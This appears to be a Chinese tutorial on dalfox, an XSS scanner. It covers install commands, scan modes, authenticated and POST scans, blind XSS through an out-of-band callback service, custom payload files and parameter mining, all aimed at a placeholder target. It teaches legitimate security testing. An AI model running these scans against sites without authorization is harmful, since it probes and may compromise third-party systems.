# dalfox 基础用法

dalfox 是 Go 写的 XSS 扫描器，**重点是 reflected 和 DOM-based XSS**，对 stored / blind 也有支持。它会内置 headless 浏览器验证 PoC 能否真正执行 JS，因此假阳性比 sqlmap 之类要低。

## 安装

```bash
brew install dalfox
go install github.com/hahwul/dalfox/v2@latest
```

验证：

```bash
dalfox version
```

## 5 种模式

| 模式 | 用途 |
|---|---|
| `url` | 单个 URL |
| `file` | URL 列表文件 |
| `pipe` | 标准输入 |
| `sxss` | stored XSS check（结果在另一个 URL） |
| `server` | 守护进程模式（HTTP API） |

## 最小命令

```bash
dalfox url 'https://target.com/?q=test' --silence
```

`--silence` 只输出 PoC，不打 banner。

## URL 列表

```bash
dalfox file urls.txt --silence -o dalfox.txt
```

## Pipe 模式（管道）

```bash
cat urls.txt | dalfox pipe --silence
gau target.com | dalfox pipe --silence
waybackurls target.com | dalfox pipe --silence
```

## POST 数据

```bash
dalfox url https://target.com/login \
  -X POST \
  -d 'username=test&password=test' \
  --silence
```

## Cookie / Header

```bash
dalfox url https://target.com/profile \
  -C 'session=abcd; remember=1' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --silence
```

## Blind XSS

注册 [xss.report](https://xss.report) 等 OOB 平台，拿一个回调 URL：

```bash
dalfox url https://target.com/contact -b https://xss.report/c/yourid --silence
```

任何最终在某处渲染的请求会触发回调，命中 stored / blind XSS。

## 自定义 payload

```bash
dalfox url https://target.com/?q=test \
  --custom-payload my-payloads.txt \
  --silence
```

`my-payloads.txt` 一行一个，会替代默认字典。

## 参数挖掘

```bash
dalfox url https://target.com/page \
  --mining-dom \
  --mining-dict \
  --silence
```

| 选项 | 来源 |
|---|---|
| `--mining-dom` | 从页面 DOM 找隐藏参数 |
| `--mining-dict` | 从内置字典爆参数名 |

## JSONL 输出

```bash
dalfox file urls.txt --format jsonl -o dalfox.jsonl
```

## 跳过 headless（更快但易误报）

```bash
dalfox url https://target.com/?q=test --skip-headless
```

适合大规模扫描时先快速过一遍，再对疑似目标二次精扫。

## 命中即 webhook

```bash
dalfox file urls.txt \
  --found-action 'curl -X POST https://hooks.slack.com/... -d {{url}}'
```

## 常见坑

- 默认 100 worker 对小站会被秒封 → 加 `--delay 100` 和 `-w 30`
- headless 模式会启 chromium，第一次慢 → 提前装好 chrome
- 别在没授权的 SaaS 上跑 blind XSS，可能伤到第三方
